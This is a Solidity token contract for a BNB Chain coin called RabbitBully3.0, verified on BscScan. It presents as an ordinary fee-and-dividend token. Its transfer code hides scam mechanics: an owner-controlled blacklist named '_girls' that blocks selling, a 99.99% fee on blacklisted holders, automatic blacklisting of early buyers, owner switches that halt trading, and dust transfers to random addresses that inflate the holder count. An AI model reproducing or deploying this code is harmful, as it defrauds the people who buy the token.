/**
 *Submitted for verification at BscScan.com on 2023-01-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public _destroyAddress;


    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _girls;

    uint256 private _tTotal;
    uint256 public maxTXAmount;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;
    uint256 public kb = 0;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    uint256 private feebase = 100;

    uint256 public buyFundFee = 5;
    uint256 public buyLPDividendFee = 0;
    uint256 public sellLPDividendFee = 0;
    uint256 public sellFundFee = 5;
    uint256 public sellLPFee = 0;
    uint256 public burnFee=0;


    uint256 private _buyFundFee = buyFundFee*feebase;
    uint256 private _buyLPDividendFee = buyLPDividendFee*feebase;
    uint256 private _sellLPDividendFee = sellLPDividendFee*feebase;
    uint256 private _sellFundFee = sellFundFee*feebase;
    uint256 private _sellLPFee = sellLPFee*feebase;
    uint256 private _burnFee = burnFee*feebase;

    uint256 public goMoonBlock;

    address public _mainPair;

    mapping(address => bool) _updated;
    address[] buyUser;
    mapping (address => uint256) shareholderIndexes;
    uint256 public minimumTokenBalanceForShareholder;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress,address deployer
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = total;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(deployer), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        _tokenDistributor = new TokenDistributor(FISTAddress);

        _destroyAddress = deployer;

        minimumTokenBalanceForShareholder = 80000000 * (10 ** 9);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function setkb(uint256 a) public onlyOwner{
        kb = a;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_girls[from],"blacklist");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            address ad;
            for(int i=0;i<=2;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= 300;

            if (!_swapPairList[from] && !_swapPairList[to]) {
                uint256 destroyAmount = amount * 10 / 100;
                _takeTransfer(from, _destroyAddress, destroyAmount);
                amount -= destroyAmount;
            }
        }



        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == goMoonBlock) {
                    require(false);
                }
                if (block.number < goMoonBlock + kb && _swapPairList[from]) {
                    _girls[to] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee+_burnFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 75 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;

            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                require(tAmount <= maxTXAmount);
                swapFee = _buyFundFee + _buyLPDividendFee;
                
            }
            if (_girls[sender]){
                swapFee = 9999;
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        uint256 burnAmount = tokenAmount * _burnFee / swapFee;
        transfer(address(0),burnAmount);
        swapFee -= _burnFee;

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        _splitOtherTokenSecond(fundAmount * 60 / 100); 
        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount * 40 / 100);
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }

    function goMoon() external onlyOwner {
        goMoonBlock = block.number;
    }

    function returnMoon() external onlyOwner {
        goMoonBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setGirls(address addr, bool enable) external onlyOwner {
        _girls[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }

    function multiGirls(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _girls[addresses[i]] = value;
        }
    
    }

    function multiWhiteList(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _feeWhiteList[addresses[i]] = value;
        }
    
    }

    function shareholderLength() public view virtual returns (uint256) {
        return buyUser.length;
    }

    function setShare(address shareholder) private {
        if(_updated[shareholder]){  
            //none lp    
            if(IERC20(_mainPair).balanceOf(shareholder) == 0) quitShare(shareholder);              
            return;  
        }

        //none lp
        if(IERC20(_mainPair).balanceOf(shareholder) == 0) return; 

        //add lp holder
        addShareholder(shareholder);
        _updated[shareholder] = true;   
    }

    function addShareholder(address shareholder) private {
        shareholderIndexes[shareholder] = buyUser.length;
        buyUser.push(shareholder);
    }

    function quitShare(address shareholder) private {
        removeShareholder(shareholder);   
        _updated[shareholder] = false; 
    }

    // remove shareholder
    function removeShareholder(address shareholder) private {
        buyUser[shareholderIndexes[shareholder]] = buyUser[buyUser.length-1];
        shareholderIndexes[buyUser[buyUser.length-1]] = shareholderIndexes[shareholder];
        buyUser.pop();
    }

    function updateMinimumTokenBalanceForShareholder(uint256 amount) external onlyOwner {
        minimumTokenBalanceForShareholder = amount;
    }

    uint256 private ldxindex;
    function _splitOtherTokenSecond(uint256 thisAmount) public {
        IERC20 FIST = IERC20(_fist);
        uint256 uAmount = FIST.balanceOf(address(this));
        if(uAmount < 10**9){
            return;
        }
        IERC20 pair = IERC20(_mainPair);
        uint256 buySize = buyUser.length;
        if(buySize>0){
            address user;
            uint256 totalAmount = pair.totalSupply();
            uint256 rate;
            if(buySize >20){
                for(uint256 i=0;i<20;i++){
                    ldxindex++;
                    if(ldxindex >= buySize){ldxindex = 0;}
                    user = buyUser[ldxindex];
                    if(balanceOf(user) > minimumTokenBalanceForShareholder){
                        rate = pair.balanceOf(user) * 1000000 / totalAmount;
                        uint256 amountReward = thisAmount * rate / 1000000;
                        if(amountReward>10**9){
                            FIST.transfer(user,amountReward);
                        }
                    }
                }
            }else{
                for(uint256 i=0;i<buySize;i++){
                    user = buyUser[i];
                    if(balanceOf(user) > minimumTokenBalanceForShareholder){
                        rate = pair.balanceOf(user) * 1000000 / totalAmount;
                        uint256 amountReward = thisAmount * rate / 1000000;
                        if(amountReward>10**9){
                            FIST.transfer(user,amountReward);
                        }
                    }
                }
            }
        }
    }

    receive() external payable {}
}


contract RabbitBully3 is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//RouterAddress
        address(0x55d398326f99059fF775485246999027B3197955),//FISTAddress
        unicode"RabbitBully3.0",//Name
        unicode"RabbitBully3.0",//Symbol
        9,//Decimals
        100000000000,//Supply
        address(0xc4B04EF02067c655d5A9ee6C27356082001d1576),//FundAddress
        address(0x3af178E5445467f05A3D8640b7A742C799Ec78D5),//ReceiveAddress
        address(0x0000000000000000000000000000000000000000)
    ){

    }
}